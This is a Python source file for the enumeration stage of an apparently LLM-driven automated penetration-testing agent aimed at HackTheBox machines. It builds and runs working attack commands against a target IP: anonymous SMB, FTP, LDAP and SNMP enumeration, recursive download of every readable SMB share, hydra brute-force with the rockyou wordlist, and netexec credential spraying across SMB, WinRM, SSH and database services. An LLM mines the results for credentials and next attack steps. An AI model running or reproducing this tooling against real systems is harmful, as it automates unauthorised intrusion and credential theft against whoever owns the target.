"""Enumeration Agent — deep per-service enumeration, SMB harvesting, cred spray."""
from __future__ import annotations
import os
import re
import shutil
from pathlib import Path
from models import HackSession, AgentResult, Stage, Finding, Severity, Credential
from llm import LLMProvider
from tools.runner import run, run_parallel
from agents.base import BaseAgent
import checkpoint as cp

NETEXEC_BIN = shutil.which("netexec") or shutil.which("crackmapexec") or "netexec"


class EnumerationAgent(BaseAgent):
    NAME  = "Enumeration"
    STAGE = Stage.ENUMERATION

    def run(self) -> AgentResult:
        result = AgentResult(agent=self.NAME, stage=self.STAGE, summary="")
        ip = self.session.target_ip
        findings: list[str] = []

        # Collect approved tasks first — then run all in parallel
        approved_tasks: list[dict] = []

        # ── SMB / NetBIOS ─────────────────────────────────────────
        smb_ports = [p for p in self.session.open_ports if p.service in ("microsoft-ds", "netbios-ssn", "smb") or p.number in (139, 445)]
        if smb_ports:
            cr = self.checkpoint(
                what_found=f"SMB open on port(s): {', '.join(str(p.number) for p in smb_ports)}",
                plan="enum4linux-ng + smbclient anonymous share listing",
                why="SMB often has anonymous access, null sessions, or world-readable shares with creds/configs. Common HTB foothold.",
                what_to_look_for="Shares named 'backup', 'files', 'Users', anonymous login, readable files, .txt/.conf/.xml files",
                command=f"enum4linux-ng -A {ip}",
                risk="low",
            )
            if cr.approved:
                cmd = cr.override if cr.action == cp.CheckpointResult.MODIFIED else f"enum4linux-ng -A {ip}"
                approved_tasks.append({"name": "enum4linux", "command": cmd, "timeout": 120, "log_dir": self.output_dir})
                approved_tasks.append({"name": "smbclient",  "command": f"smbclient -L //{ip} -N", "timeout": 30, "log_dir": self.output_dir})

        # ── FTP ───────────────────────────────────────────────────
        ftp_ports = [p for p in self.session.open_ports if p.service == "ftp" or p.number == 21]
        if ftp_ports:
            cr = self.checkpoint(
                what_found=f"FTP on port {ftp_ports[0].number}: {ftp_ports[0].version}",
                plan="Test anonymous login, list files",
                why="Anonymous FTP is common on HTB. Files in FTP root often contain creds or configs.",
                what_to_look_for="Anonymous login success, files like passwords.txt, config.xml, .key files, upload directory",
                command=f"ftp -n {ip} <<< $'user anonymous\\npass\\nls -la\\nbye'",
                risk="low",
            )
            if cr.approved:
                approved_tasks.append({
                    "name": "ftp_anon",
                    "command": ["bash", "-c", f"echo -e 'open {ip}\\nuser anonymous\\npass\\nls -la\\nbye' | ftp -n"],
                    "timeout": 30, "log_dir": self.output_dir,
                })

        # ── SSH version check (no tool needed — already in session) ─
        ssh_port = self.session.ssh_port
        if ssh_port:
            self.log(f"SSH on port {ssh_port.number}: {ssh_port.version}")
            findings.append(f"SSH: {ssh_port.version} (check for CVEs, username enumeration)")

        # ── LDAP ─────────────────────────────────────────────────
        ldap_ports = [p for p in self.session.open_ports if "ldap" in p.service.lower() or p.number in (389, 636, 3268)]
        if ldap_ports:
            cr = self.checkpoint(
                what_found=f"LDAP on port(s): {', '.join(str(p.number) for p in ldap_ports)}",
                plan="ldapsearch: base query → full user enumeration (anonymous)",
                why="Anonymous LDAP leaks usernames, groups, description fields (often contain passwords), and full AD structure.",
                what_to_look_for="User accounts, description fields with passwords, service accounts, domain naming context",
                command=f"ldapsearch -x -H ldap://{ip} -b '' -s base namingContexts",
                risk="low",
            )
            if cr.approved:
                # Base query first to get naming context
                approved_tasks.append({
                    "name": "ldap_base",
                    "command": f"ldapsearch -x -H ldap://{ip} -b '' -s base namingContexts",
                    "timeout": 30, "log_dir": self.output_dir,
                })
                # Full user enum — try without base DN first (works on many HTB AD boxes)
                approved_tasks.append({
                    "name": "ldap_users",
                    "command": (
                        f"ldapsearch -x -H ldap://{ip} -b 'DC=htb,DC=local' "
                        f"'(objectClass=user)' sAMAccountName description mail 2>/dev/null || "
                        f"ldapsearch -x -H ldap://{ip} -b '' '(objectClass=user)' "
                        f"sAMAccountName description 2>/dev/null"
                    ),
                    "timeout": 60, "log_dir": self.output_dir,
                })

        # ── SNMP ─────────────────────────────────────────────────
        snmp_ports = [p for p in self.session.open_ports if "snmp" in p.service.lower() or p.number == 161]
        if snmp_ports:
            cr = self.checkpoint(
                what_found="SNMP port 161 open",
                plan="snmpwalk with community string 'public'",
                why="SNMP with default community 'public' leaks system info, running processes, network interfaces, user accounts.",
                what_to_look_for="Running processes (may show credentials in command lines), installed software, network config",
                command=f"snmpwalk -v2c -c public {ip}",
                risk="low",
            )
            if cr.approved:
                approved_tasks.append({"name": "snmp", "command": f"snmpwalk -v2c -c public {ip}", "timeout": 60, "log_dir": self.output_dir})

        # ── Hydra brute-force if usernames enumerated + login service ─
        # Collect usernames already found from earlier stages
        known_users = list({c.username for c in self.session.credentials if c.username})
        # Also extract usernames from enum4linux output later — done in analysis phase

        # ── Run all approved tasks in parallel ────────────────────
        if approved_tasks:
            self.log(f"Running {len(approved_tasks)} enumeration task(s) in parallel...")
            parallel_results = run_parallel(approved_tasks, max_workers=len(approved_tasks))

            if "enum4linux" in parallel_results:
                result.raw_outputs["enum4linux"] = parallel_results["enum4linux"].output
                findings.append(f"SMB enumeration:\n{parallel_results['enum4linux'].output[:500]}")
            if "smbclient" in parallel_results:
                result.raw_outputs["smbclient_list"] = parallel_results["smbclient"].output
                findings.append(f"SMB shares:\n{parallel_results['smbclient'].output[:300]}")
            if "ftp_anon" in parallel_results:
                result.raw_outputs["ftp_anon"] = parallel_results["ftp_anon"].output
                findings.append(f"FTP anonymous:\n{parallel_results['ftp_anon'].output[:300]}")
            if "ldap_base" in parallel_results:
                result.raw_outputs["ldap_base"] = parallel_results["ldap_base"].output
                findings.append(f"LDAP base:\n{parallel_results['ldap_base'].output[:300]}")
            if "ldap_users" in parallel_results and parallel_results["ldap_users"].output:
                result.raw_outputs["ldap_users"] = parallel_results["ldap_users"].output
                findings.append(f"LDAP users:\n{parallel_results['ldap_users'].output[:1500]}")
            if "snmp" in parallel_results:
                result.raw_outputs["snmp"] = parallel_results["snmp"].output
                findings.append(f"SNMP:\n{parallel_results['snmp'].output[:500]}")

        # ── LLM analysis of all enumeration ─────────────────────
        if findings:
            self.log("LLM analysing enumeration results...")
            combined = "\n\n---\n\n".join(findings)
            analysis = self.ask_json(f"""
Analyse this enumeration data from an HTB machine at {ip}.

FINDINGS:
{combined[:5000]}

Respond with JSON:
{{
  "credentials_found": [{{"username": "", "password": "", "service": "", "note": ""}}],
  "interesting_files": ["list of files worth downloading"],
  "attack_vectors": ["ordered list of attack paths to try"],
  "usernames": ["any usernames found"],
  "key_finding": "most important single finding in one sentence",
  "what_to_do_next": "specific next command to run"
}}""")

            # Surface credentials
            for cred in analysis.get("credentials_found", []):
                from models import Credential
                if cred.get("username"):
                    self.session.credentials.append(Credential(**{k: v for k, v in cred.items() if k in ("username", "password", "hash", "service", "note")}))

            result.next_actions = analysis.get("attack_vectors", [])
            result.metadata = analysis

            # ── Hydra brute-force — LAST RESORT only ─────────────
            # Only fires when: usernames found + login service open + no other attack vectors
            llm_users = [u.strip() for u in analysis.get("usernames", []) if u and u.strip()]
            all_users = list(dict.fromkeys(known_users + llm_users))
            has_other_vectors = bool(analysis.get("attack_vectors")) or bool(self.session.web_targets)
            if all_users and not has_other_vectors:
                self.log("No other attack vectors — hydra brute as last resort", "warning")
                self._try_hydra_bruteforce(ip, all_users, result)
            elif all_users and has_other_vectors:
                self.log(f"Skipping hydra — {len(analysis.get('attack_vectors', []))} other vector(s) available. Hydra = last resort.", "info")

            cp.section("Enumeration Analysis")
            from rich.console import Console
            from rich.panel import Panel
            Console().print(Panel(
                f"[bold green]Key finding:[/bold green] {analysis.get('key_finding', 'No key findings')}\n\n"
                f"[bold]Attack vectors:[/bold]\n" + "\n".join(f"  {i+1}. {v}" for i, v in enumerate(analysis.get("attack_vectors", []))) + "\n\n"
                f"[bold cyan]Next action:[/bold cyan] {analysis.get('what_to_do_next', '')}",
                title="[cyan]Enumeration Complete[/cyan]",
                border_style="cyan",
            ))

        # ── SMB file harvester ────────────────────────────────────
        if smb_ports and "smbclient" in {t["name"] for t in approved_tasks}:
            self._harvest_smb_shares(ip, result)

        # ── NetExec credential spray ──────────────────────────────
        sprayable_creds = [c for c in self.session.credentials if c.username and c.password]
        if sprayable_creds:
            self._spray_credentials(ip, sprayable_creds, result)

        result.summary = f"Enumerated {len(self.session.open_ports)} services. Found {len(self.session.credentials)} credentials. Loot: {len(self.session.loot)} files."
        return result

    # ── Hydra brute-force helper ─────────────────────────────────

    HYDRA_WORDLISTS = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
        "/usr/share/wordlists/fasttrack.txt",
    ]

    def _find_wordlist(self) -> str:
        import os
        for w in self.HYDRA_WORDLISTS:
            if os.path.exists(w):
                return w
        return ""

    def _try_hydra_bruteforce(self, ip: str, usernames: list[str], result) -> None:
        """Run hydra against SSH/FTP with enumerated usernames + top password list."""
        from pathlib import Path
        wordlist = self._find_wordlist()
        if not wordlist:
            self.log("No password wordlist found (rockyou/seclists)", "warning")
            return

        # Determine attackable services
        targets: list[tuple[str, int]] = []
        for p in self.session.open_ports:
            if p.service == "ssh" or p.number == 22:
                targets.append(("ssh", p.number))
            elif p.service == "ftp" or p.number == 21:
                targets.append(("ftp", p.number))

        if not targets:
            return

        # Write usernames to a file
        users_file = Path(self.output_dir) / "hydra_users.txt"
        users_file.write_text("\n".join(usernames[:20]))  # cap at 20

        for svc, port in targets:
            cr = self.checkpoint(
                what_found=f"{svc.upper()} on port {port} + {len(usernames)} enumerated users",
                plan=f"hydra brute-force with rockyou top passwords (capped)",
                why=f"Enumerated usernames + weak-password wordlist = common HTB foothold. "
                    f"Hydra will stop on first hit.",
                what_to_look_for="[svc] host: X login: Y password: Z — indicates successful auth",
                command=f"hydra -L {users_file} -P {wordlist} -f -t 4 -e nsr {svc}://{ip}:{port}",
                risk="medium",
            )
            if not cr.approved:
                continue

            cmd = cr.override if cr.action == cp.CheckpointResult.MODIFIED else (
                # -f: stop on first hit, -t 4: threads (be nice), -e nsr: try empty/reverse/same
                # Small wordlist cap via head to keep it under 5 min
                f"bash -c 'hydra -L {users_file} -P <(head -500 {wordlist}) "
                f"-f -t 4 -e nsr -w 3 {svc}://{ip}:{port} 2>&1'"
            )
            self.log(f"Hydra brute-force on {svc}:{port} (limited to top 500 passwords)...")
            r = run(cmd, timeout=300, log_dir=self.output_dir)
            result.raw_outputs[f"hydra_{svc}_{port}"] = r.output

            # Parse hit
            hit = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", r.output)
            if hit:
                user, pwd = hit.group(1), hit.group(2)
                cred = Credential(username=user, password=pwd, service=svc,
                                  note=f"hydra brute on port {port}")
                self.session.credentials.append(cred)
                self.log(f"HYDRA HIT: {user}:{pwd} on {svc}:{port}", "success")

    # ── SMB file harvester ────────────────────────────────────────

    def _harvest_smb_shares(self, ip: str, result: AgentResult) -> None:
        """Recursively download all accessible SMB share files."""
        # Parse shares from smbclient output
        smb_out = result.raw_outputs.get("smbclient_list", "")
        shares = re.findall(r"^\s+(\S+)\s+Disk", smb_out, re.M)
        # Filter out system shares
        shares = [s for s in shares if s not in ("IPC$", "print$", "ADMIN$", "C$")]
        if not shares:
            return

        self.log(f"SMB shares found: {', '.join(shares)}")
        loot_base = Path(self.output_dir) / "loot" / "smb"
        loot_base.mkdir(parents=True, exist_ok=True)

        for share in shares:
            cr = self.checkpoint(
                what_found=f"SMB share accessible: \\\\{ip}\\{share}",
                plan=f"Recursively download all files from share",
                why="SMB shares on HTB often contain creds, configs, SSH keys, DB backups, source code. Grab everything, read later.",
                what_to_look_for="*.txt, *.xml, *.conf, *.key, *.zip, *.bak, id_rsa, web.config, .env, database files",
                command=f"smbclient //{ip}/{share} -N -c 'recurse ON; prompt OFF; mget *'",
                risk="low",
            )
            if not cr.approved:
                continue

            share_dir = loot_base / share
            share_dir.mkdir(exist_ok=True)
            self.log(f"Harvesting \\\\{ip}\\{share} → {share_dir}...")

            # smbclient mget downloads to CWD — run from share_dir
            r = run(
                f"smbclient //{ip}/{share} -N -c 'recurse ON; prompt OFF; mget *'",
                timeout=120, log_dir=self.output_dir, cwd=str(share_dir),
            )
            result.raw_outputs[f"smb_harvest_{share}"] = r.output

            # Catalog what was downloaded
            downloaded = list(share_dir.rglob("*"))
            files = [str(f) for f in downloaded if f.is_file()]
            if files:
                self.session.loot.extend(files)
                self.log(f"Harvested {len(files)} file(s) from {share}", "success")
                # Print interesting-looking files
                interesting = [f for f in files if any(
                    kw in f.lower() for kw in ("pass", "cred", "key", "secret", "config", "backup", "admin", ".env")
                )]
                if interesting:
                    self.log(f"Interesting loot: {', '.join(Path(f).name for f in interesting[:5])}", "success")
            else:
                self.log(f"No files downloaded from {share} (empty or access denied)", "warning")

    # ── NetExec credential spray ──────────────────────────────────

    def _spray_credentials(self, ip: str, creds: list[Credential], result: AgentResult) -> None:
        """Spray found credentials against all open services via netexec."""
        if not shutil.which(NETEXEC_BIN):
            self.log("netexec not found — skipping spray", "warning")
            return

        # Determine sprayable protocols based on open ports
        protocols: list[str] = []
        for p in self.session.open_ports:
            if p.number in (445, 139) or p.service in ("microsoft-ds", "netbios-ssn"):
                if "smb" not in protocols:
                    protocols.append("smb")
            if p.number in (5985, 5986) or "winrm" in p.service.lower():
                if "winrm" not in protocols:
                    protocols.append("winrm")
            if p.service == "ssh" or p.number == 22:
                if "ssh" not in protocols:
                    protocols.append("ssh")
            if p.service == "ftp" or p.number == 21:
                if "ftp" not in protocols:
                    protocols.append("ftp")
            if p.number == 1433 or "mssql" in p.service.lower():
                if "mssql" not in protocols:
                    protocols.append("mssql")
            if p.number in (3306, 3307) or "mysql" in p.service.lower():
                if "mysql" not in protocols:
                    protocols.append("mysql")

        if not protocols:
            return

        cred_summary = ", ".join(f"{c.username}:{c.password}" for c in creds[:5])
        cr = self.checkpoint(
            what_found=f"{len(creds)} credential(s) found: {cred_summary}",
            plan=f"netexec spray across {', '.join(protocols)}",
            why="Credentials found in one service often reused elsewhere. NetExec tests all protocols in seconds — common HTB pattern is SMB cred also works for WinRM.",
            what_to_look_for="[+] Pwn3d! or (Pwn3d!) = admin. [+] without Pwn3d = valid user. Captures hash for PTH.",
            command=f"netexec smb {ip} -u USER -p PASS (per protocol)",
            risk="medium",
        )
        if not cr.approved:
            return

        for proto in protocols:
            self.log(f"NetExec spraying {len(creds)} cred(s) on {proto.upper()}...")
            tasks = []
            for i, cred in enumerate(creds[:20]):  # cap at 20 creds
                tasks.append({
                    "name": f"nxc_{proto}_{i}",
                    "command": f"{NETEXEC_BIN} {proto} {ip} -u {cred.username!r} -p {cred.password!r} --continue-on-success",
                    "timeout": 30,
                    "log_dir": self.output_dir,
                })

            nxc_results = run_parallel(tasks, max_workers=min(5, len(tasks)))

            for task_name, r in nxc_results.items():
                result.raw_outputs[task_name] = r.output
                # [+] = success, Pwn3d! = admin
                hits = re.findall(r"\[\+\].*?(\S+)\s+(\S+)\s+\\(\S+):(\S+)", r.output)
                for hit in hits:
                    _, _, user, pwd = hit
                    pwned = "Pwn3d!" in r.output
                    idx = int(task_name.split("_")[-1])
                    existing = creds[idx] if idx < len(creds) else None
                    note = f"netexec {proto}" + (" [ADMIN/Pwn3d!]" if pwned else "")
                    if existing:
                        existing.service = proto
                        existing.note = note
                    else:
                        self.session.credentials.append(Credential(
                            username=user, password=pwd, service=proto, note=note,
                        ))
                    level = "success" if pwned else "info"
                    self.log(f"NXC {proto.upper()} HIT: {user}:{pwd}{' [ADMIN]' if pwned else ''}", level)
